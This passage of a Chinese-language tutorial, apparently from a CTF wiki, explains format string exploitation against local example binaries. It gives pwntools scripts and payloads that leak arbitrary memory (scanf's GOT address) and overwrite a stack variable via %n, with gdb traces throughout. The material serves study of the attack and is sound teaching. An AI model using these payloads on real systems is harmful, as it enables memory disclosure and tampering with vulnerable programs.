版本以及其他函数的地址，这时候，能够完全控制泄露某个指定地址的内存就显得很重要了。那么我们究竟能不能这样做呢？自然也是可以的啦。</p><p>我们再仔细回想一下，一般来说，在格式化字符串漏洞中，我们所读取的格式化字符串都是在栈上的（因为是某个函数的局部变量，本例中 s 是 main 函数的局部变量）。那么也就是说，在调用输出函数的时候，其实，第一个参数的值其实就是该格式化字符串的地址。我们选择上面的某个函数调用为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Breakpoint 1, __printf (format=0xffffcd10 &quot;%s&quot;) at printf.c:28<br>28  in printf.c<br>──────────────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>──────────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10     ← $esp<br>0xffffcd00│+0x04: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)//参数传递进去的作用<br>0xffffcd04│+0x08: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd08│+0x0c: 0x000000c2<br>0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10│+0x14: 0xff007325 (&quot;%s&quot;?)     ← $eax<br>0xffffcd14│+0x18: 0xffffce3c  →  0xffffd074  →  &quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;<br>0xffffcd18│+0x1c: 0x000000e0<br></code></pre></td></tr></table></figure><p>可以看出在栈上的第二个变量就是我们的格式化字符串地址 0xffffcd10，同时该地址存储的也确实是 “%s” 格式化字符串内容。</p><p>那么由于我们可以控制该格式化字符串，如果我们知道该格式化字符串在输出函数调用时是第几个参数，这里假设该格式化字符串相对函数调用为第 k 个参数。那我们就可以通过如下的方式来获取某个指定地址 addr 的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">addr%k$s<br></code></pre></td></tr></table></figure><blockquote><p>注： 在这里，如果格式化字符串在栈上，那么我们就一定确定格式化字符串的相对偏移，这是因为在函数调用的时候栈指针至少低于格式化字符串地址 8 字节或者 16 字节。</p></blockquote><p>下面就是如何确定该格式化字符串为第几个参数的问题了，我们可以通过如下方式确定</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">[tag]%</span><span class="language-bash">p%p%p%p%p%p...</span><br></code></pre></td></tr></table></figure><p>一般来说，我们会重复某个字符的机器字长来作为 tag，而后面会跟上若干个 %p 来输出栈上的内容，如果内容与我们前面的 tag 重复了，那么我们就可以有很大把握说明该地址就是格式化字符串的地址，之所以说是有很大把握，这是因为不排除栈上有一些临时变量也是该数值。一般情况下，极其少见，我们也可以更换其他字符进行尝试，进行再次确认。这里我们利用字符’A’作为特定字符，同时还是利用之前编译好的程序，如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ ./leakmemory<br><span class="hljs-meta prompt_">AAAA%</span><span class="language-bash">p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</span><br>00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p<br><span class="hljs-meta prompt_">AAAA0xffaab1600xc20xf76146bb0x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70250xffaab2240xf77360000xaec7%</span><br></code></pre></td></tr></table></figure><p>由 0x41414141 处所在的位置可以看出我们的格式化字符串的起始地址正好是输出函数的第 5 个参数，但是是格式化字符串的第 4 个参数。我们可以来测试一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ ./leakmemory<br><span class="hljs-meta prompt_">%</span><span class="language-bash">4<span class="hljs-variable">$s</span></span><br>00000001.22222222.ffffffff.%4$s<br>[1]    61439 segmentation fault (core dumped)  ./leakmemory<br></code></pre></td></tr></table></figure><p>可以看出，我们的程序崩溃了，为什么呢？这是因为我们试图将该格式化字符串所对应的值作为地址进行解析，但是显然该值没有办法作为一个合法的地址被解析，，所以程序就崩溃了。具体的可以参考下面的调试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs assembly"> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>───────────────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffcd0c&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffcd0c│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10     ← $esp<br>0xffffcd10│+0x04: 0xffffcd20  →  &quot;%4$s&quot;<br>0xffffcd14│+0x08: 0xffffcd20  →  &quot;%4$s&quot;<br>0xffffcd18│+0x0c: 0x000000c2<br>0xffffcd1c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd20│+0x14: &quot;%4$s&quot;     ← $eax<br>0xffffcd24│+0x18: 0xffffce00  →  0x00000000<br>0xffffcd28│+0x1c: 0x000000e0<br>───────────────────────────────────────────────────────────────────[ trace ]────<br>[#0] 0xf7e44670 → Name: __printf(format=0xffffcd20 &quot;%4$s&quot;)<br>[#1] 0x80484ce → Name: main()<br>────────────────────────────────────────────────────────────────────────────────<br>gef➤  help x/<br>Examine memory: x/FMT ADDRESS.<br>ADDRESS is an expression for the memory address to examine.<br>FMT is a repeat count followed by a format letter and a size letter.<br>Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal),<br>  t(binary), f(float), a(address), i(instruction), c(char), s(string)<br>  and z(hex, zero padded on the left).<br>Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes).<br>The specified number of objects of the specified size are printed<br>according to the format.<br><br>Defaults for format and size letters are those previously used.<br>Default count is 1.  Default address is following last thing printed<br>with this command or &quot;print&quot;.<br>gef➤  x/x 0xffffcd20<br>0xffffcd20: 0x73243425<br>gef➤  vmmap<br>Start      End        Offset     Perm Path<br>0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br>0x08049000 0x0804a000 0x00000000 r-- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br>0x0804a000 0x0804b000 0x00001000 rw- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br>0x0804b000 0x0806c000 0x00000000 rw- [heap]<br>0xf7dfb000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fab000 0xf7fad000 0x001af000 r-- /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fad000 0xf7fae000 0x001b1000 rw- /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fae000 0xf7fb1000 0x00000000 rw-<br>0xf7fd3000 0xf7fd5000 0x00000000 rw-<br>0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]<br>0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]<br>0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so<br>0xf7ffb000 0xf7ffc000 0x00000000 rw-<br>0xf7ffc000 0xf7ffd000 0x00022000 r-- /lib/i386-linux-gnu/ld-2.23.so<br>0xf7ffd000 0xf7ffe000 0x00023000 rw- /lib/i386-linux-gnu/ld-2.23.so<br>0xffedd000 0xffffe000 0x00000000 rw- [stack]<br>gef➤  x/x 0x73243425<br>0x73243425: Cannot access memory at address 0x73243425<br></code></pre></td></tr></table></figure><p>显然 0xffffcd20 处所对应的格式化字符串所对应的变量值 0x73243425 并不能够被改程序访问，所以程序就自然崩溃了。</p><p>那么如果我们设置一个可访问的地址呢？比如说 scanf@got，结果会怎么样呢？应该自然是输出 scanf 对应的地址了。我们不妨来试一下。</p><p>首先，获取 scanf@got 的地址，如下</p><blockquote><p>这里之所以没有使用 printf 函数，是因为 scanf 函数会对 0a，0b，0c，00 等字符有一些奇怪的处理，，导致无法正常读入，，感兴趣的可以试试。。。。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">gef➤  got<br><br>/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory：     文件格式 elf32-i386<br><br>DYNAMIC RELOCATION RECORDS<br>OFFSET   TYPE              VALUE<br>08049ffc R_386_GLOB_DAT    __gmon_start__<br>0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.0<br>0804a010 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0<br>0804a014 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7<br></code></pre></td></tr></table></figure><p>下面我们利用 pwntools 构造 payload 如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br>sh = process(&#x27;./leakmemory&#x27;)<br>leakmemory = ELF(&#x27;./leakmemory&#x27;)<br>__isoc99_scanf_got = leakmemory.got[&#x27;__isoc99_scanf&#x27;]<br>print hex(__isoc99_scanf_got)<br>payload = p32(__isoc99_scanf_got) + &#x27;%4$s&#x27;<br>print payload<br>gdb.attach(sh)<br>sh.sendline(payload)<br>sh.recvuntil(&#x27;%4$s\n&#x27;)<br>print hex(u32(sh.recv()[4:8])) # remove the first bytes of __isoc99_scanf@got<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>其中，我们使用 gdb.attach(sh) 来进行调试。当我们运行到第二个 printf 函数的时候 (记得下断点)，可以看到我们的第四个参数确实指向我们的 scanf 的地址，这里输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly"> → 0xf7615670 &lt;printf+0&gt;       call   0xf76ebb09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf76ebb09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf76ebb0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf76ebb0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf76ebb10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>───────────────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffbbf8dc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffbbf8dc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10     ← $esp<br>0xffbbf8e0│+0x04: 0xffbbf8f0  →  0x0804a014  →  0xf76280c0  →  &lt;__isoc99_scanf+0&gt; push ebp<br>0xffbbf8e4│+0x08: 0xffbbf8f0  →  0x0804a014  →  0xf76280c0  →  &lt;__isoc99_scanf+0&gt; push ebp<br>0xffbbf8e8│+0x0c: 0x000000c2<br>0xffbbf8ec│+0x10: 0xf765c6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffbbf8f0│+0x14: 0x0804a014  →  0xf76280c0  →  &lt;__isoc99_scanf+0&gt; push ebp  ← $eax<br>0xffbbf8f4│+0x18: &quot;%4$s&quot;<br>0xffbbf8f8│+0x1c: 0x00000000<br></code></pre></td></tr></table></figure><p>同时，在我们运行的 terminal 下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ python exploit.py<br>[+] Starting local process &#x27;./leakmemory&#x27;: pid 65363<br>[*] &#x27;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory&#x27;<br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br>0x804a014<br>\x14\xa0\x0%4$s<br>[*] running in new terminal: /usr/bin/gdb -q  &quot;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory&quot; 65363<br>[+] Waiting for debugger: Done<br>0xf76280c0<br>[*] Switching to interactive mode<br>[*] Process &#x27;./leakmemory&#x27; stopped with exit code 0 (pid 65363)<br>[*] Got EOF while reading in interactiv<br></code></pre></td></tr></table></figure><p>我们确实得到了 scanf 的地址。</p><p>但是，并不是说所有的偏移机器字长的整数倍，可以让我们直接相应参数来获取，有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容的地址位于机器字长整数倍的地址处，一般来说，类似于下面的这个样子。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">[padding][addr]<br></code></pre></td></tr></table></figure><p>注意</p><blockquote><p>我们不能直接在命令行输入 \ x0c\xa0\x04\x08%4$s 这是因为虽然前面的确实是 printf@got 的地址，但是，scanf 函数并不会将其识别为对应的字符串，而是会将 ,x,0,c 分别作为一个字符进行读入。下面就是错误的例子。</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-number">0</span>xffffccfc│<span class="hljs-operator">+</span><span class="hljs-number">0</span><span class="hljs-params">x00:</span> <span class="hljs-number">0</span>x080484ce  →  <span class="hljs-operator">&lt;</span>main<span class="hljs-operator">+</span><span class="hljs-number">99</span><span class="hljs-operator">&gt;</span> add esp, <span class="hljs-number">0</span>x10   ← $esp<br><span class="hljs-number">0</span>xffffcd00│<span class="hljs-operator">+</span><span class="hljs-number">0</span><span class="hljs-params">x04:</span> <span class="hljs-number">0</span>xffffcd10  →  <span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>0c<span class="hljs-char escape_">\x</span>a0<span class="hljs-char escape_">\x</span>04<span class="hljs-char escape_">\x</span>08%4$s&quot;</span><br><span class="hljs-number">0</span>xffffcd04│<span class="hljs-operator">+</span><span class="hljs-number">0</span><span class="hljs-params">x08:</span> <span class="hljs-number">0</span>xffffcd10  →  <span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>0c<span class="hljs-char escape_">\x</span>a0<span class="hljs-char escape_">\x</span>04<span class="hljs-char escape_">\x</span>08%4$s&quot;</span><br><span class="hljs-number">0</span>xffffcd08│<span class="hljs-operator">+</span><span class="hljs-number">0</span><span class="hljs-params">x0c:</span> <span class="hljs-number">0</span>x000000c2<br><span class="hljs-number">0</span>xffffcd0c│<span class="hljs-operator">+</span><span class="hljs-number">0</span><span class="hljs-params">x10:</span> <span class="hljs-number">0</span>xf7e8b6bb  →  <span class="hljs-operator">&lt;</span>handle_intel<span class="hljs-operator">+</span><span class="hljs-number">107</span><span class="hljs-operator">&gt;</span> add esp, <span class="hljs-number">0</span>x10<br><span class="hljs-number">0</span>xffffcd10│<span class="hljs-operator">+</span><span class="hljs-number">0</span><span class="hljs-params">x14:</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>0c<span class="hljs-char escape_">\x</span>a0<span class="hljs-char escape_">\x</span>04<span class="hljs-char escape_">\x</span>08%4$s&quot;</span>   ← $eax<br><span class="hljs-number">0</span>xffffcd14│<span class="hljs-operator">+</span><span class="hljs-number">0</span><span class="hljs-params">x18:</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>a0<span class="hljs-char escape_">\x</span>04<span class="hljs-char escape_">\x</span>08%4$s&quot;</span><br><span class="hljs-number">0</span>xffffcd18│<span class="hljs-operator">+</span><span class="hljs-number">0</span><span class="hljs-params">x1c:</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x</span>04<span class="hljs-char escape_">\x</span>08%4$s&quot;</span><br>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────<br>[<span class="hljs-comment">#0] 0xf7e44670 → Name: __printf(format=0xffffcd10 &quot;\\x0c\\xa0\\x04\\x08%4$s&quot;)</span><br>[<span class="hljs-comment">#1] 0x80484ce → Name: main()</span><br>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>gef➤  x<span class="hljs-symbol">/x</span> <span class="hljs-number">0</span>xffffcd10<br><span class="hljs-number">0</span><span class="hljs-params">xffffcd10:</span>   <span class="hljs-number">0</span>x6330785c<br></code></pre></td></tr></table></figure></blockquote><h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><p>上面，我们已经展示了如何利用格式化字符串来泄露栈内存以及任意地址内存，那么我们有没有可能修改栈上变量的值呢，甚至修改任意地址变量的内存呢? 答案是可行的，只要变量对应的地址可写，我们就可以利用格式化字符串来修改其对应的数值。这里我们可以想一下格式化字符串中的类型</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">%</span><span class="language-bash">n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</span><br></code></pre></td></tr></table></figure><p>通过这个类型参数，再加上一些小技巧，我们就可以达到我们的目的，这里仍然分为两部分，一部分为覆盖栈上的变量，第二部分为覆盖指定地址的变量。</p><p>这里我们给出如下的程序来介绍相应的部分。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* example/overflow/overflow.c */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> a = <span class="hljs-number">123</span>, b = <span class="hljs-number">456</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">int</span> c = <span class="hljs-number">789</span>;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>];<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>, &amp;c);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">if</span> (c == <span class="hljs-number">16</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified c.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a == <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified a for a small number.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0x12345678</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified b for a big number!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>makefile 在对应的文件夹中。而无论是覆盖哪个地址的变量，我们基本上都是构造类似如下的 payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">...[overwrite addr]....%[overwrite offset]$n<br></code></pre></td></tr></table></figure><p>其中… 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。所以一般来说，也是如下步骤</p><ul><li>确定覆盖地址</li><li>确定相对偏移</li><li>进行覆盖</li></ul><h4 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h4><h5 id="确定覆盖地址"><a href="#确定覆盖地址" class="headerlink" title="确定覆盖地址"></a>确定覆盖地址</h5><p>首先，我们自然是来想办法知道栈变量 c 的地址。由于目前几乎上所有的程序都开启了 aslr 保护，所以栈的地址一直在变，所以我们这里故意输出了 c 变量的地址。</p><h5 id="确定相对偏移"><a href="#确定相对偏移" class="headerlink" title="确定相对偏移"></a>确定相对偏移</h5><p>其次，我们来确定一下存储格式化字符串的地址是 printf 将要输出的第几个参数 ()。 这里我们通过之前的泄露栈变量数值的方法来进行操作。通过调试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly"> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>────────────────────────────────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffcd0c&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffcd0c│+0x00: 0x080484d7  →  &lt;main+76&gt; add esp, 0x10     ← $esp<br>0xffffcd10│+0x04: 0xffffcd28  →  &quot;%d%d&quot;<br>0xffffcd14│+0x08: 0xffffcd8c  →  0x00000315<br>0xffffcd18│+0x0c: 0x000000c2<br>0xffffcd1c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd20│+0x14: 0xffffcd4e  →  0xffff0000  →  0x00000000<br>0xffffcd24│+0x18: 0xffffce4c  →  0xffffd07a  →  &quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;<br>0xffffcd28│+0x1c: &quot;%d%d&quot;     ← $eax<br></code></pre></td></tr></table></figure><p>我们可以发现在 0xffffcd14 处存储着变量 c 的数值。继而，我们再确定格式化字符串’%d%d’的地址 0xffffcd28 相对于 printf 函数的格式化字符串参数 0xffffcd10 的偏移为 0x18，即格式化字符串相当于 printf 函数的第 7 个参数，相当于格式化字符串的第 6 个参数。</p><h5 id="进行覆盖"><a href="#进行覆盖" class="headerlink" title="进行覆盖"></a>进行覆盖</h5><p>这样，第 6 个参数处的值就是存储变量 c 的地址，我们便可以利用 %n 的特征来修改 c 的值。payload 如下</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[addr of <span class="hljs-keyword">c</span>]<span class="hljs-variable">%012</span>d<span class="hljs-variable">%6</span>$n<br></code></pre></td></tr></table></figure><p>addr of c 的长度为 4，故而我们得再输入 12 个字符才可以达到 16 个字符，以便于来修改 c 的值为 16。</p><p>具体脚本如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python3">def forc():<br>    sh = process(&#x27;./overwrite&#x27;)<br>    c_addr = int(sh.recvuntil(&#x27;\n&#x27;, drop=True), 16)<br>    print hex(c_addr)<br>    payload = p32(c_addr) + &#x27;%012d&#x27; + &#x27;%6$n&#x27;<br>    print payload<br>    #gdb.attach(sh)<br>    sh.sendline(payload)<br>    print sh.recv()<br>    sh.interactive()<br><br>forc()<br></code></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜  overwrite git:(master) ✗ python exploit.py<br>[+] Starting local process &#x27;./overwrite&#x27;: pid 74806<br>0xfffd8cdc<br>܌��%012d%6$n<br>܌��-00000160648modified c.<br></code></pre></td></tr></table></figure><h4 id="覆盖任意地址的内存"><a href="#覆盖任意地址的内存" class="headerlink" title="覆盖任意地址的内存"></a>覆盖任意地址的内存</h4><h5 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h5><p>首先，我们来考虑一下如何修改 data 段的变量为一个较小的数字，比如说，<strong>小于机器字长的数字</strong>。这里以 2 为例。可能会觉得这其实没有什么区别，可仔细一想，真的没有么？如果我们还是将要覆盖的地址放在最前面，那么将直接占用机器字长个 (4 或 8) 字节。显然，无论之后如何输出，都只会比 4 